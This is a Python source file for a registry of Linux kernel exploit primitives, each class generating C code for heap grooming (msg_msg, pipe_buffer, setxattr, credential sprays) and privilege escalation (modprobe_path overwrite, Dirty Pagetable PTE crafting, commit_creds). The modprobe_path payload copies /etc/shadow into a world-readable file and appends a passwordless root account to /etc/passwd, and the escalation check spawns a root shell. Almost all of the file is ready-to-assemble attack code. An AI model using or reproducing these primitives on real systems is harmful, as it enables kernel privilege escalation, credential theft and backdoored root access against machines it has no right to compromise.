"""Exploit primitive registry: maps technique names to C code generators.

Each primitive class provides:
- ``generate_c()`` -> str: Complete C code fragment for the technique
- ``required_headers()`` -> list[str]: C headers needed
- ``slab_cache_target()`` -> str: Which kmalloc cache this targets
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Optional


# ---------------------------------------------------------------------------
# Base class
# ---------------------------------------------------------------------------

class ExploitPrimitive:
    """Base class for all exploit primitives."""

    name: str = ""
    description: str = ""

    def generate_c(self) -> str:
        raise NotImplementedError

    def required_headers(self) -> list[str]:
        return []

    def slab_cache_target(self) -> str:
        return ""


# ---------------------------------------------------------------------------
# Heap grooming primitives
# ---------------------------------------------------------------------------

class MsgMsgSpray(ExploitPrimitive):
    """Spray msg_msg objects to fill a target slab cache.

    msg_msg is one of the most versatile heap spray objects because:
    - Size is fully controlled by the attacker (up to ~4048 bytes per msg)
    - Content is fully controlled
    - Messages > PAGE_SIZE - sizeof(msg_msg) create msg_msgseg chains
    - Easy cleanup via msgrcv()
    """

    name = "msg_msg_spray"
    description = "System V IPC message queue heap spray"

    def __init__(self, target_size: int = 256, spray_count: int = 256):
        self.target_size = target_size
        self.spray_count = spray_count

    def generate_c(self) -> str:
        return f'''\
/* --- Heap groom: msg_msg spray --- */
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define SPRAY_MSG_SIZE {self.target_size}
#define SPRAY_MSG_COUNT {self.spray_count}
#define SPRAY_QUEUE_COUNT 16

struct spray_msg {{
    long mtype;
    char mtext[SPRAY_MSG_SIZE];
}};

static int spray_queues[SPRAY_QUEUE_COUNT];

static int msg_spray_setup(void) {{
    for (int i = 0; i < SPRAY_QUEUE_COUNT; i++) {{
        spray_queues[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (spray_queues[i] < 0) {{
            perror("msgget");
            return -1;
        }}
    }}
    return 0;
}}

static int msg_spray_fill(void) {{
    struct spray_msg msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', SPRAY_MSG_SIZE);

    int per_queue = SPRAY_MSG_COUNT / SPRAY_QUEUE_COUNT;

    for (int i = 0; i < SPRAY_QUEUE_COUNT; i++) {{
        for (int j = 0; j < per_queue; j++) {{
            if (msgsnd(spray_queues[i], &msg, SPRAY_MSG_SIZE, 0) < 0) {{
                perror("msgsnd");
                return -1;
            }}
        }}
    }}
    printf("[groom] Sprayed %d msg_msg objects (size=%d)\\n",
           SPRAY_MSG_COUNT, SPRAY_MSG_SIZE);
    return 0;
}}

static int msg_spray_free_one(int queue_idx) {{
    struct spray_msg msg;
    if (msgrcv(spray_queues[queue_idx], &msg, SPRAY_MSG_SIZE, 0, IPC_NOWAIT) < 0)
        return -1;
    return 0;
}}

static void msg_spray_cleanup(void) {{
    for (int i = 0; i < SPRAY_QUEUE_COUNT; i++) {{
        msgctl(spray_queues[i], IPC_RMID, NULL);
    }}
}}
/* --- end msg_msg spray --- */
'''

    def required_headers(self) -> list[str]:
        return ["sys/ipc.h", "sys/msg.h"]

    def slab_cache_target(self) -> str:
        # msg_msg header is 48 bytes; the data is inline.
        # Total object size = sizeof(msg_msg) + data_size
        total = 48 + self.target_size
        caches = [64, 96, 128, 192, 256, 512, 1024, 2048, 4096]
        for c in caches:
            if total <= c:
                return f"kmalloc-{c}" if c < 1024 else f"kmalloc-{c//1024}k"
        return "kmalloc-8k"


class PipeBufferSpray(ExploitPrimitive):
    """Spray pipe_buffer objects via pipe() + write().

    pipe_buffer is allocated in kmalloc-1k (16 pipe_buffer structs per
    page on x86_64).  Useful when the target object is in the same cache.
    The `ops` field points to kernel .text, making it excellent for KASLR
    bypass when combined with a cross-object read.
    """

    name = "pipe_buffer_spray"
    description = "Pipe-based heap spray for kmalloc-1k"

    def __init__(self, spray_count: int = 128):
        self.spray_count = spray_count

    def generate_c(self) -> str:
        return f'''\
/* --- Heap groom: pipe_buffer spray --- */
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>

#define PIPE_SPRAY_COUNT {self.spray_count}

static int spray_pipes[PIPE_SPRAY_COUNT][2];

static int pipe_spray_setup(void) {{
    for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {{
        if (pipe(spray_pipes[i]) < 0) {{
            perror("pipe");
            return -1;
        }}
    }}
    return 0;
}}

static int pipe_spray_fill(void) {{
    for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {{
        /* Write enough to allocate pipe_buffer objects */
        if (write(spray_pipes[i][1], "AAAAAAAA", 8) < 0) {{
            perror("pipe write");
            return -1;
        }}
    }}
    printf("[groom] Sprayed %d pipe_buffer objects\\n", PIPE_SPRAY_COUNT);
    return 0;
}}

static int pipe_spray_free_range(int start, int count) {{
    for (int i = start; i < start + count && i < PIPE_SPRAY_COUNT; i++) {{
        close(spray_pipes[i][0]);
        close(spray_pipes[i][1]);
    }}
    return 0;
}}

static void pipe_spray_cleanup(void) {{
    pipe_spray_free_range(0, PIPE_SPRAY_COUNT);
}}
/* --- end pipe_buffer spray --- */
'''

    def slab_cache_target(self) -> str:
        return "kmalloc-1k"


class SetxattrSpray(ExploitPrimitive):
    """Spray controlled-content kernel objects via setxattr().

    setxattr() allocates a kmalloc buffer of exact user-controlled size,
    copies user data into it, then frees it.  The brief window where
    the buffer exists can be extended using userfaultfd or FUSE.

    This is a classic technique for spraying arbitrary-content objects
    into specific slab caches.
    """

    name = "setxattr_spray"
    description = "setxattr-based spray for controlled content"

    def __init__(self, target_size: int = 256):
        self.target_size = target_size

    def generate_c(self) -> str:
        return f'''\
/* --- Heap groom: setxattr spray --- */
#include <sys/xattr.h>
#include <stdio.h>
#include <string.h>

/*
 * setxattr allocates kmalloc(size) and copies user data into it.
 * Combined with userfaultfd to pause mid-copy, we can place a
 * controlled object in a target slab cache.
 *
 * Without userfaultfd, the allocation is too transient to be useful
 * alone, but it can be combined with other techniques.
 */
static int setxattr_spray_one(const char *path, const void *data, size_t size) {{
    return setxattr(path, "user.spray", data, size, 0);
}}
/* --- end setxattr spray --- */
'''


class DirtyCredSpray(ExploitPrimitive):
    """Spray credential objects via fork() + unshare(CLONE_NEWUSER)."""

    name = "dirty_cred_spray"
    description = "Credential spray via user namespaces"

    def __init__(self, spray_count: int = 64):
        self.spray_count = spray_count

    def generate_c(self) -> str:
        return f'''\
/* --- Heap groom: dirty_cred credential spray --- */
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

#define CRED_SPRAY_COUNT {self.spray_count}

static pid_t cred_pids[CRED_SPRAY_COUNT];

static int cred_spray_setup(void) {{
    for (int i = 0; i < CRED_SPRAY_COUNT; i++) {{
        pid_t pid = fork();
        if (pid < 0) {{
            perror("fork");
            return -1;
        }}
        if (pid == 0) {{
            /* Child: create new user namespace to allocate fresh creds */
            if (unshare(CLONE_NEWUSER) < 0) {{
                perror("unshare");
                _exit(1);
            }}
            pause();  /* Keep alive to hold cred in slab */
            _exit(0);
        }}
        cred_pids[i] = pid;
    }}
    printf("[groom] Sprayed %d credential objects\\n", CRED_SPRAY_COUNT);
    return 0;
}}

static void cred_spray_cleanup(void) {{
    for (int i = 0; i < CRED_SPRAY_COUNT; i++) {{
        if (cred_pids[i] > 0) {{
            kill(cred_pids[i], SIGKILL);
            waitpid(cred_pids[i], NULL, 0);
        }}
    }}
}}
/* --- end dirty_cred spray --- */
'''


# ---------------------------------------------------------------------------
# Escalation primitives
# ---------------------------------------------------------------------------

class ModprobePath(ExploitPrimitive):
    """Privilege escalation via modprobe_path overwrite.

    If we have an arbitrary write primitive, overwriting the kernel's
    modprobe_path variable to point to a user-controlled script gives
    code execution as root when an unknown binary format is executed.
    """

    name = "modprobe_path"
    description = "modprobe_path overwrite for root code execution"

    def generate_c(self) -> str:
        return '''\
/* --- Escalation: modprobe_path overwrite --- */
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

#define MODPROBE_SCRIPT "/tmp/.modprobe_pwn"
#define DUMMY_BINARY    "/tmp/.dummy_elf"
#define FLAG_FILE       "/tmp/.pwned"

static int setup_modprobe_payload(void) {
    /* Create the payload script that will run as root */
    FILE *fp = fopen(MODPROBE_SCRIPT, "w");
    if (!fp) return -1;
    fprintf(fp, "#!/bin/sh\\n");
    fprintf(fp, "cp /etc/shadow %s\\n", FLAG_FILE);
    fprintf(fp, "chmod 0666 %s\\n", FLAG_FILE);
    /* For full root shell: */
    fprintf(fp, "echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd\\n");
    fclose(fp);
    chmod(MODPROBE_SCRIPT, 0777);

    /* Create a dummy file with invalid ELF header */
    fp = fopen(DUMMY_BINARY, "w");
    if (!fp) return -1;
    fprintf(fp, "\\xff\\xff\\xff\\xff");
    fclose(fp);
    chmod(DUMMY_BINARY, 0777);

    return 0;
}

static int trigger_modprobe(void) {
    /* Executing the dummy binary triggers the kernel to run modprobe_path */
    system(DUMMY_BINARY);
    return 0;
}

/*
 * Usage:
 * 1. arb_write(modprobe_path_addr, "/tmp/.modprobe_pwn")
 * 2. setup_modprobe_payload()
 * 3. trigger_modprobe()
 * 4. Root code has been executed
 */
/* --- end modprobe_path --- */
'''


class DirtyPagetable(ExploitPrimitive):
    """Privilege escalation via page table entry manipulation.

    Dirty Pagetable abuses a UAF or double-free in the slab allocator
    to reallocate the freed object as a PTE page.  By writing controlled
    data to the PTE entries, the attacker maps arbitrary physical pages
    into their address space, enabling arbitrary physical memory access.
    """

    name = "dirty_pagetable"
    description = "PTE manipulation for arbitrary physical memory access"

    def generate_c(self) -> str:
        return '''\
/* --- Escalation: Dirty Pagetable --- */
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

/*
 * Dirty Pagetable attack flow:
 *
 * 1. Trigger UAF/double-free on a slab object
 * 2. Free enough objects to return the slab page to the page allocator
 * 3. Spray mmap()/munmap() to get the page reallocated as a PTE page
 * 4. The dangling reference now points into a PTE page
 * 5. Write a crafted PTE entry that maps a physical page we want
 * 6. Access the mapped page to read/write arbitrary physical memory
 * 7. Use physical memory access to modify our process credentials
 *
 * The target physical pages for cred modification:
 * - Walk the init_task list to find our task_struct
 * - Locate the cred pointer
 * - Overwrite uid/gid/euid/egid to 0
 */

#define PTE_PRESENT  (1UL << 0)
#define PTE_RW       (1UL << 1)
#define PTE_USER     (1UL << 2)
#define PTE_ACCESSED (1UL << 5)
#define PTE_DIRTY    (1UL << 6)
#define PTE_PSE      (1UL << 7)  /* Page Size Extension (for 2MB pages) */
#define PTE_NX       (1UL << 63)

/* Craft a PTE entry that maps a target physical address with RW access */
static unsigned long craft_pte(unsigned long phys_addr) {
    return (phys_addr & ~0xFFFUL) | PTE_PRESENT | PTE_RW | PTE_USER |
           PTE_ACCESSED | PTE_DIRTY;
}

/* Number of mmap regions to spray for PTE page allocation */
#define PTE_SPRAY_COUNT 512
#define PTE_SPRAY_SIZE  (2 * 1024 * 1024)  /* 2MB each */

static void *pte_spray_addrs[PTE_SPRAY_COUNT];

static int pte_spray_setup(void) {
    for (int i = 0; i < PTE_SPRAY_COUNT; i++) {
        pte_spray_addrs[i] = mmap(NULL, PTE_SPRAY_SIZE,
                                   PROT_READ | PROT_WRITE,
                                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        if (pte_spray_addrs[i] == MAP_FAILED) {
            perror("mmap pte spray");
            return -1;
        }
        /* Touch the pages to force PTE allocation */
        *(volatile char *)pte_spray_addrs[i] = 0;
    }
    printf("[escalate] PTE spray: %d regions mapped\\n", PTE_SPRAY_COUNT);
    return 0;
}

static void pte_spray_cleanup(void) {
    for (int i = 0; i < PTE_SPRAY_COUNT; i++) {
        if (pte_spray_addrs[i] && pte_spray_addrs[i] != MAP_FAILED)
            munmap(pte_spray_addrs[i], PTE_SPRAY_SIZE);
    }
}
/* --- end dirty_pagetable --- */
'''


class CommitCredsEscalation(ExploitPrimitive):
    """Escalation via commit_creds(prepare_kernel_cred(0)).

    Classic technique: if we can redirect kernel control flow (e.g., via
    corrupted function pointer), call prepare_kernel_cred(NULL) to create
    a root credential, then commit_creds() to apply it to the current
    process.
    """

    name = "commit_creds"
    description = "Direct commit_creds(prepare_kernel_cred(0)) invocation"

    def generate_c(self) -> str:
        return '''\
/* --- Escalation: commit_creds --- */
#include <stdio.h>
#include <unistd.h>

/*
 * After resolving kernel symbols (KASLR bypass), call:
 *   prepare_kernel_cred(0) -> returns a root cred struct
 *   commit_creds(cred)     -> applies it to the current task
 *
 * This is typically done via:
 * - ROP chain (stack pivot + gadgets)
 * - Corrupted function pointer in a kernel object (e.g., pipe_buffer.ops)
 * - JIT spray (BPF, if available)
 *
 * After returning to userspace, getuid() == 0.
 */

typedef unsigned long (*prepare_kernel_cred_t)(unsigned long);
typedef unsigned long (*commit_creds_t)(unsigned long);

static int escalate_commit_creds(
    unsigned long prepare_kernel_cred_addr,
    unsigned long commit_creds_addr
) {
    /* These would be called from kernel context via the hijacked
     * control flow, not directly from userspace.  This structure
     * is used by the ROP chain builder or function pointer overwrite. */
    printf("[escalate] prepare_kernel_cred @ 0x%lx\\n", prepare_kernel_cred_addr);
    printf("[escalate] commit_creds @ 0x%lx\\n", commit_creds_addr);
    return 0;
}

static void check_root(void) {
    if (getuid() == 0) {
        printf("[escalate] SUCCESS: got root (uid=0)\\n");
        printf("[escalate] Spawning shell...\\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[escalate] FAILED: still uid=%d\\n", getuid());
    }
}
/* --- end commit_creds --- */
'''


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------

PRIMITIVE_REGISTRY: dict[str, type[ExploitPrimitive]] = {
    "msg_msg_spray": MsgMsgSpray,
    "pipe_buffer_spray": PipeBufferSpray,
    "setxattr_spray": SetxattrSpray,
    "dirty_cred_spray": DirtyCredSpray,
    "modprobe_path": ModprobePath,
    "dirty_pagetable": DirtyPagetable,
    "commit_creds": CommitCredsEscalation,
}


def get_primitive(name: str, **kwargs) -> ExploitPrimitive:
    """Instantiate a named primitive with optional configuration."""
    cls = PRIMITIVE_REGISTRY.get(name)
    if cls is None:
        raise ValueError(f"Unknown primitive: {name}. Available: {list(PRIMITIVE_REGISTRY.keys())}")
    return cls(**kwargs)


def list_primitives() -> list[str]:
    """Return names of all registered primitives."""
    return list(PRIMITIVE_REGISTRY.keys())
